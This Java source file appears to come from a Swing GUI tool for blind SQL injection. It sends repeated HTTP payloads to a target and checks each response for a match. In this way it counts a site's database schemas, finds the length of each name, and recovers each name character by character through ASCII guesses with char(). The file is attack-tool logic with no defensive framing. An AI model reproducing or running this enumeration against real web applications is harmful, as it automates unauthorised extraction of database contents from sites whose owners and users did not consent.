/**
 * @ BlindSQLInjectionManager.java
 */
package logic;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;

import javax.swing.JLabel;
import javax.swing.JTextArea;
import javax.swing.SwingWorker;
import javax.swing.table.DefaultTableModel;

import domain.HttpPayload;
import domain.UserInput;
import ui.BlindSQLInjectionResultUI;

/**
 * <pre>
 * logic
 * BlindSQLInjectionManager.java 
 * </pre>
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/09/05
 */
public class BlindSQLInjectionManager{

	/** helper classes **/
	private SuccessDecider decider = null;
	private HttpHelper HttpHelper = null;
	private HttpPayloadFactory factory = null;
	
	/** result print target **/
	private JLabel statusLabel = null;
	private JTextArea logArea = null;
	private BlindSQLInjectionResultUI resultUI = null;
	
	/** print variables **/
	private int requestCount = 0;
	private int dbCount = 0;
	List<Integer> dbLengths = new ArrayList<Integer>();
	
	/**
	 * 
	 */
	public BlindSQLInjectionManager() {
		decider = new SuccessDecider();
		HttpHelper = new HttpHelper();
		factory = new HttpPayloadFactory();
	}
	
	public void setResultUI(BlindSQLInjectionResultUI resultUI) {
		this.resultUI = resultUI;
	}

	public void setStatusLabel(JLabel statusLabel){
		this.statusLabel = statusLabel;
	}
	
	public void setLogArea(JTextArea logArea){
		this.logArea = logArea;
	}
	
	public void getDBCount(UserInput input) {
		cntWork(input, input.getCountUntil(), "DB Count");
	}
	
	/**
	 * @Method 	: getDBNameLengths
	 * @brief	: DB명의 길이를 리턴한다. 
	 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
	 * @Date	: 2017/09/05
	 * @param input
	 * @param dbCount : DB스키마의 개수(getDBCount 메서드의 실행결과)
	 * @return
	 */
	public List<Integer> getDBNameLengths(UserInput input, int dbCount) {
		List<Integer> dbLengths = new ArrayList<Integer>();
		for (int i=0; i < dbCount; i++){
			getDBNameLength(input, i);
			//dbLengths.add(dbNameLength);
		}
		return dbLengths;
	}
	
	private void getDBNameLength(UserInput input, int dbIndex){
		//System.out.println("target dbIndex : " + dbIndex);
		UserInput newParam = input.copy(input);
		newParam.setDbIndex(dbIndex);
		cntWork(newParam, newParam.getLengthUntil(), "DB Name Length");
	}
	
	private void cntWork(UserInput input, int until, String workName){
		
		SwingWorker<Integer, Integer> worker = new SwingWorker<Integer, Integer>(){
			@Override
			protected Integer doInBackground() throws Exception {
				System.out.println("# doBackground : dbIndex : " + input.getDbIndex());
				int cnt = 0;
				//input.setDbIndex(dbIndex);
				
				for(int i=0; i < until; i++){
					publish(i);
					input.setCheckVal(i+"");
					//requestCount ++;
					HttpPayload payload = factory.getHttpPayload(input);
					String res = HttpHelper.send(payload);
					if(decider.isSuccess(res, input.getMatch())){
						cnt = i;
						break;
					}
				}
				return cnt;
			}

			@Override
			protected void process(List<Integer> chunks) {
				requestCount ++;
				System.out.println("req count : " + requestCount);
				//System.out.println("process...:" + chunks.get(chunks.size() -1)+"");
				//statusLabel.setText(chunks.get(chunks.size() -1)+"");
				statusLabel.setText(requestCount+"");
			}
			
			@Override
			protected void done() {
				try {
					int cnt = get();
					if(cnt > 0){
						logArea.setText(logArea.getText() + "\n" + workName + " founded : " + cnt);
						// add to 
						DefaultTableModel dbTableModel =  resultUI.getDBResultUI().getTableModel();
						Integer[] row = {input.getDbIndex() , cnt};
						dbTableModel.addRow(row);
						
					}else {
						
					}
				} catch (InterruptedException e) {
					e.printStackTrace();
				} catch (ExecutionException e) {
					e.printStackTrace();
				}
				
			}
		};
		worker.execute();
	}
	
	public List<String> getDBNames(UserInput input, int dbCount, List<Integer> dbNameLengths){
		List<String> dbNames = new ArrayList<String>();
		for (int i=0; i < dbCount; i++){
			input.setDbIndex(i); // set dbIndex
			String dbName = getDBName(input, dbNameLengths.get(i));
			dbNames.add(dbName);
		}
		/*
		SwingWorker<Boolean, String> worker = new SwingWorker<Boolean, String>(){
			@Override
			protected Boolean doInBackground() throws Exception {
				for (int i=0; i < dbCount; i++){
					input.setDbIndex(i); // set dbIndex
					String dbName = getDBName(input, dbNameLengths.get(i));
					dbNames.add(dbName);
					
					publish(dbName);
				}
				return true;
			}
			
			@Override
			protected void process(List<String> chunks) {
				statusLabel.setText(chunks.get(chunks.size() -1));
			}
		};
		worker.execute();
		*/
		return dbNames;
	}
	
	private String getDBName(UserInput input, int dbNameLength){
		int targetContentLength = dbNameLength;
		String content = "";
		for(int i=0; i < targetContentLength ; i++){
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				input.setDbNameIndex(i+1);  //이 것을 X테이블이나 칼럼일 경우 어떻게 할 것인지...
				input.setCheckVal("char("+j+")");
				HttpPayload payload = factory.getHttpPayload(input);
				String res = HttpHelper.send(payload);
				
				if(decider.isSuccess(res, input.getMatch())){
					//System.out.println("find !! at : " + j);
					String ascii = Character.toString((char)j);
					content += ascii;
					break;
				}
			}
		}
		return content;
	}
	
	// table
	//public int getTableCount(UserInput input);
	
}
